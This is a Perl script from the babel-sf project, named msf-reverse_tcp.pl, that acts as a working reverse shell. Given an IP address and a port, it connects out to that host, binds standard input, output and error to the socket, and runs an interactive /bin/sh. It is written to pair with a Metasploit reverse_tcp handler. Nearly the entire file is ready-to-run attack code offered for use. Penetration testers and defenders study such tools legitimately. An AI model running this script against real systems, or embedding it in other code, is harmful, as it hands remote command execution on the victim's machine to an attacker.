#!/usr/bin/perl -w
#
# msf-reverse_tcp.pl version 0.2
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

use warnings;
use strict;
use POSIX qw(strftime);

my $date = strftime "%m-%d-%Y %H:%M", localtime;
my $num_args = $#ARGV + 1;
if ($num_args == 0 or $ARGV[0] eq "-h" or $ARGV[0] eq "--help" or $ARGV[0] eq "--h" or $ARGV[0] eq "-help") {
	print"msf-reverse_tcp.pl ( https://github.com/attackdebris/babel-sf )\n\n";
	print"[This script should be utilised with a linux/x86/shell/reverse_tcp msf handler]\n";
	print"\nUsage:"; 
        print"\n  perl msf-reverse_tcp.pl [remote handler IP] [port number]";
	print"\n  perl msf-reverse_tcp.pl e.g. perl msf-reverse_tcp.pl 192.168.0.1 4444\n";
}
elsif ($num_args != 2) {
	print"2 arguments are required, please check your syntax.\n";
}
elsif ($num_args == 2) {
	my $host = $ARGV[0];
	my $port = $ARGV[1];
	print"Starting msf-reverse_tcp.pl ( https://github.com/attackdebris/babel-sf ) at $date\n";
	print"Attemping to connect to $host on TCP port $port....\n";
	use Socket;
	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
	if(connect(S,sockaddr_in($port,inet_aton($host)))) {
	  open(STDIN,">&S");
	  open(STDOUT,">&S");
	  open(STDERR,">&S");
	  exec("/bin/sh -i");
	}
}